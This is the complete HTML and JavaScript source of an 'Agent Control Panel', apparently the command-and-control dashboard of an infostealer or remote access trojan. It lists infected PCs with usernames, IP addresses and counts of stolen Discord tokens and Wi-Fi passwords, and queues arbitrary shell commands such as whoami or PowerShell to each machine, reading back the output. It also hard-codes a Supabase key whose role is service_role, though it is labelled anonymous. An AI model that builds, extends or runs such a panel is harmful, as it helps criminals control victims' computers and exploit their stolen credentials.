<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Agent Control Panel</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #ccc; 
            font-family: 'Courier New', monospace; 
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        
        /* Header */
        .header { 
            border-bottom: 1px solid #0f0; 
            padding-bottom: 10px; 
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
        }
        .title { color: #0f0; font-size: 20px; }
        
        /* Stats */
        .stats {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 10px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #111;
            border: 1px solid #333;
            padding: 15px;
            text-align: center;
        }
        .stat-number { font-size: 28px; color: #0f0; font-weight: bold; }
        .stat-label { font-size: 10px; color: #666; margin-top: 5px; }
        
        /* Command Bar */
        .command-bar {
            background: #111;
            border: 1px solid #0f0;
            padding: 15px;
            margin-bottom: 20px;
            display: none;
        }
        .command-bar input {
            background: #000;
            border: 1px solid #333;
            color: #0f0;
            padding: 10px;
            width: 70%;
            font-family: monospace;
        }
        .command-bar button {
            background: #1a1a1a;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 10px 20px;
            cursor: pointer;
            margin-left: 10px;
        }
        .command-bar button:hover { background: #0f0; color: #000; }
        .output {
            background: #000;
            border: 1px solid #333;
            margin-top: 10px;
            padding: 10px;
            font-size: 11px;
            max-height: 150px;
            overflow-y: auto;
            color: #0a0;
        }
        
        /* Filters */
        .filters {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .filters input {
            background: #1a1a1a;
            border: 1px solid #333;
            color: #fff;
            padding: 8px;
            width: 200px;
        }
        .filters button {
            background: #1a1a1a;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 8px 15px;
            cursor: pointer;
        }
        
        /* Agent Grid */
        .agent-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 15px;
        }
        .agent-card {
            background: #111;
            border: 1px solid #222;
            padding: 15px;
            cursor: pointer;
        }
        .agent-card:hover { border-color: #0f0; }
        .agent-card.selected { border-color: #0f0; background: #0f0a0a; }
        .agent-name { color: #0f0; font-size: 16px; font-weight: bold; }
        .agent-status { font-size: 10px; margin-left: 10px; }
        .online { color: #0f0; }
        .offline { color: #f44; }
        .agent-details { font-size: 11px; color: #888; margin-top: 8px; }
        .agent-actions { margin-top: 10px; display: flex; gap: 8px; justify-content: flex-end; }
        .agent-actions button {
            padding: 4px 12px;
            font-size: 10px;
            background: #1a1a1a;
            border: 1px solid #333;
            color: #fff;
            cursor: pointer;
        }
        .agent-actions button:hover { border-color: #0f0; color: #0f0; }
        
        /* Modal */
        .modal {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.95);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .modal-content {
            background: #111;
            border: 1px solid #0f0;
            max-width: 800px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
            padding: 20px;
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        .close { cursor: pointer; color: #f44; }
        pre {
            background: #000;
            padding: 10px;
            overflow-x: auto;
            font-size: 10px;
        }
        
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #0f0;
            color: #000;
            padding: 10px 20px;
            display: none;
        }
        
        .login-box {
            max-width: 300px;
            margin: 100px auto;
            background: #111;
            border: 1px solid #0f0;
            padding: 30px;
            text-align: center;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #1a1a1a;
            border: 1px solid #333;
            color: #0f0;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background: #1a1a1a;
            border: 1px solid #0f0;
            color: #0f0;
            cursor: pointer;
        }
        .error { color: #f44; font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>

<div id="login-section">
    <div class="login-box">
        <h2 style="color:#0f0">AGENT CONTROL</h2>
        <input type="email" id="email" placeholder="Email">
        <input type="password" id="password" placeholder="Password">
        <div id="login-error" class="error"></div>
        <button onclick="login()">LOGIN</button>
    </div>
</div>

<div id="app-section" style="display:none">
    <div class="container">
        <div class="header">
            <div class="title">[ AGENT CONTROL PANEL ]</div>
            <div><span id="user-email"></span> <button onclick="logout()" style="margin-left:10px">EXIT</button></div>
        </div>
        
        <div class="stats">
            <div class="stat-card"><div class="stat-number" id="stat-total">0</div><div class="stat-label">AGENTS</div></div>
            <div class="stat-card"><div class="stat-number" id="stat-online">0</div><div class="stat-label">ONLINE</div></div>
            <div class="stat-card"><div class="stat-number" id="stat-tokens">0</div><div class="stat-label">TOKENS</div></div>
            <div class="stat-card"><div class="stat-number" id="stat-wifi">0</div><div class="stat-label">WIFI</div></div>
            <div class="stat-card"><div class="stat-number" id="stat-cmds">0</div><div class="stat-label">COMMANDS</div></div>
        </div>
        
        <div id="command-bar" class="command-bar">
            <div><strong>TARGET:</strong> <span id="target-name">none</span></div>
            <div style="margin-top:10px">
                <input type="text" id="cmd-input" placeholder="whoami | ipconfig | dir C:\ | powershell Get-Process" onkeypress="if(event.key==='Enter') sendCommand()">
                <button onclick="sendCommand()">EXECUTE</button>
                <button onclick="clearOutput()">CLEAR</button>
                <button onclick="deleteSelectedAgent()" style="border-color:#f44;color:#f44">DELETE</button>
            </div>
            <div id="cmd-output" class="output">> Ready. Select an agent.</div>
        </div>
        
        <div class="filters">
            <input type="text" id="filter-name" placeholder="Filter by PC name" onkeyup="filterAgents()">
            <input type="text" id="filter-ip" placeholder="Filter by IP" onkeyup="filterAgents()">
            <button onclick="fetchAgents()">REFRESH</button>
            <button id="delete-filtered-btn" onclick="deleteFiltered()" style="display:none;border-color:#f44;color:#f44">DELETE FILTERED</button>
        </div>
        
        <div id="agent-grid" class="agent-grid"></div>
    </div>
</div>

<div id="detail-modal" class="modal" onclick="if(event.target===this) closeModal()">
    <div class="modal-content">
        <div class="modal-header"><h3>AGENT DETAILS</h3><span class="close" onclick="closeModal()">[X]</span></div>
        <div id="detail-content"></div>
    </div>
</div>

<div id="toast" class="toast"></div>

<script>
// ===== REPLACE THIS WITH YOUR REAL ANON KEY =====
const SUPABASE_URL = "https://jojyzviwhosnnkjbtbse.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Impvanl6dml3aG9zbm5ramJ0YnNlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3OTEzNTY5OCwiZXhwIjoyMDk0NzExNjk4fQ.JJmSBTBud2RVraJI0Bln26ZofK0xmMWWgaBzeAF5RMs";
// ================================================

const { createClient } = supabase;
const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

let currentUser = null;
let agents = [];
let filteredAgents = [];
let selectedAgent = null;
let pollInterval = null;

async function login() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const { error } = await sb.auth.signInWithPassword({ email, password });
    if (error) {
        document.getElementById('login-error').innerText = error.message;
    } else {
        location.reload();
    }
}

async function logout() {
    await sb.auth.signOut();
    location.reload();
}

async function checkSession() {
    const { data: { session } } = await sb.auth.getSession();
    if (session) {
        currentUser = session.user;
        document.getElementById('login-section').style.display = 'none';
        document.getElementById('app-section').style.display = 'block';
        document.getElementById('user-email').innerHTML = currentUser.email;
        fetchAgents();
        setInterval(fetchAgents, 15000);
    }
}

async function fetchAgents() {
    const { data, error } = await sb.from('pc_reports').select('*').order('last_seen', { ascending: false });
    if (!error && data) {
        agents = data;
        filterAgents();
        updateStats();
    }
}

function filterAgents() {
    const nameFilter = document.getElementById('filter-name').value.toLowerCase();
    const ipFilter = document.getElementById('filter-ip').value.toLowerCase();
    filteredAgents = agents.filter(a => {
        const matchName = !nameFilter || (a.pc_name || '').toLowerCase().includes(nameFilter);
        const matchIp = !ipFilter || ((a.public_ip || a.local_ip || '')).toLowerCase().includes(ipFilter);
        return matchName && matchIp;
    });
    renderAgents();
    
    const deleteBtn = document.getElementById('delete-filtered-btn');
    if (filteredAgents.length > 0 && (nameFilter || ipFilter)) {
        deleteBtn.style.display = 'inline-block';
        deleteBtn.innerText = `DELETE ${filteredAgents.length} FILTERED`;
    } else {
        deleteBtn.style.display = 'none';
    }
}

function renderAgents() {
    const grid = document.getElementById('agent-grid');
    if (!filteredAgents.length) {
        grid.innerHTML = '<div style="text-align:center;padding:40px;color:#444">No agents connected</div>';
        return;
    }
    
    grid.innerHTML = '';
    filteredAgents.forEach(agent => {
        const raw = agent.raw_specs || {};
        const lastSeen = agent.last_seen ? Math.floor((Date.now() - new Date(agent.last_seen)) / 60000) : 999;
        const isOnline = lastSeen < 5;
        const isSelected = selectedAgent === agent.visitor_id;
        
        const card = document.createElement('div');
        card.className = `agent-card ${isSelected ? 'selected' : ''}`;
        card.onclick = () => selectAgent(agent.visitor_id, agent.pc_name);
        card.innerHTML = `
            <div>
                <span class="agent-name">💻 ${escapeHtml(agent.pc_name || 'unknown')}</span>
                <span class="agent-status ${isOnline ? 'online' : 'offline'}">${isOnline ? '● ONLINE' : '○ OFFLINE'}</span>
            </div>
            <div class="agent-details">
                👤 ${escapeHtml(agent.username || '?')}<br>
                🌐 ${escapeHtml(agent.public_ip || agent.local_ip || '?')}<br>
                🔑 ${(raw.discord_tokens || []).length} tokens | 📶 ${(raw.wifi_passwords || []).length} wifi<br>
                💾 ${raw.ram_gb || agent.memory_gb || '?'}GB | 🧠 ${raw.cpu_cores || agent.cpu_cores || '?'} cores<br>
                ⏱️ ${lastSeen}m ago
            </div>
            <div class="agent-actions">
                <button onclick="event.stopPropagation(); showDetail('${agent.id}')">DETAILS</button>
                <button onclick="event.stopPropagation(); selectAgent('${agent.visitor_id}', '${escapeHtml(agent.pc_name)}')">CMD</button>
                <button onclick="event.stopPropagation(); deleteAgent('${agent.visitor_id}', '${escapeHtml(agent.pc_name)}')">DELETE</button>
            </div>
        `;
        grid.appendChild(card);
    });
}

function updateStats() {
    document.getElementById('stat-total').innerText = agents.length;
    const online = agents.filter(a => a.last_seen && (Date.now() - new Date(a.last_seen)) < 300000).length;
    document.getElementById('stat-online').innerText = online;
    
    let tokens = 0, wifi = 0;
    agents.forEach(a => {
        const raw = a.raw_specs || {};
        tokens += (raw.discord_tokens || []).length;
        wifi += (raw.wifi_passwords || []).length;
    });
    document.getElementById('stat-tokens').innerText = tokens;
    document.getElementById('stat-wifi').innerText = wifi;
    
    updateCmdStats();
}

async function updateCmdStats() {
    const { count } = await sb.from('pc_commands').select('*', { count: 'exact', head: true });
    document.getElementById('stat-cmds').innerText = count || 0;
}

function selectAgent(id, name) {
    selectedAgent = id;
    document.getElementById('target-name').innerHTML = name;
    document.getElementById('command-bar').style.display = 'block';
    document.getElementById('cmd-input').focus();
    renderAgents();
    
    if (pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(pollOutput, 3000);
}

async function sendCommand() {
    if (!selectedAgent) { toast('Select an agent first'); return; }
    const cmd = document.getElementById('cmd-input').value.trim();
    if (!cmd) return;
    
    const output = document.getElementById('cmd-output');
    output.innerHTML += `\n> [${new Date().toLocaleTimeString()}] ${cmd}\n  ⏳ SENT...\n`;
    output.scrollTop = output.scrollHeight;
    
    const { error } = await sb.from('pc_commands').insert({
        command_for: selectedAgent,
        command: cmd,
        status: 'pending'
    });
    
    if (error) {
        output.innerHTML += `  ❌ ERROR: ${error.message}\n`;
    } else {
        document.getElementById('cmd-input').value = '';
        toast('Command sent');
        updateCmdStats();
    }
}

async function pollOutput() {
    if (!selectedAgent) return;
    const { data } = await sb.from('pc_commands')
        .select('*')
        .eq('command_for', selectedAgent)
        .eq('status', 'completed')
        .order('created_at', { ascending: false })
        .limit(3);
    
    if (data && data.length) {
        const output = document.getElementById('cmd-output');
        for (const cmd of data.reverse()) {
            const marker = `CMD_${cmd.id}`;
            if (!output.innerHTML.includes(marker)) {
                output.innerHTML += `\n📡 OUTPUT (${new Date(cmd.created_at).toLocaleTimeString()}):\n${cmd.output || '(no output)'}\n${'-'.repeat(50)}\n`;
                output.scrollTop = output.scrollHeight;
            }
        }
    }
}

function clearOutput() {
    document.getElementById('cmd-output').innerHTML = '> Ready.';
}

async function deleteAgent(id, name) {
    if (confirm(`Delete ${name} and all its data?`)) {
        await sb.from('pc_reports').delete().eq('visitor_id', id);
        await sb.from('pc_commands').delete().eq('command_for', id);
        if (selectedAgent === id) {
            selectedAgent = null;
            document.getElementById('command-bar').style.display = 'none';
        }
        toast('Agent deleted');
        await fetchAgents();
    }
}

async function deleteSelectedAgent() {
    if (selectedAgent) {
        deleteAgent(selectedAgent, document.getElementById('target-name').innerHTML);
    }
}

async function deleteFiltered() {
    if (filteredAgents.length === 0) return;
    if (confirm(`Delete ${filteredAgents.length} agents?`)) {
        for (const agent of filteredAgents) {
            await sb.from('pc_reports').delete().eq('visitor_id', agent.visitor_id);
            await sb.from('pc_commands').delete().eq('command_for', agent.visitor_id);
        }
        if (selectedAgent && filteredAgents.some(a => a.visitor_id === selectedAgent)) {
            selectedAgent = null;
            document.getElementById('command-bar').style.display = 'none';
        }
        toast(`Deleted ${filteredAgents.length} agents`);
        await fetchAgents();
    }
}

async function showDetail(id) {
    const agent = agents.find(a => a.id == id);
    if (!agent) return;
    document.getElementById('detail-content').innerHTML = `<pre>${escapeHtml(JSON.stringify(agent.raw_specs || agent, null, 2))}</pre>`;
    document.getElementById('detail-modal').style.display = 'flex';
}

function closeModal() {
    document.getElementById('detail-modal').style.display = 'none';
}

function toast(msg) {
    const t = document.getElementById('toast');
    t.innerText = msg;
    t.style.display = 'block';
    setTimeout(() => t.style.display = 'none', 2000);
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str).replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));
}

checkSession();
</script>
</body>
</html>
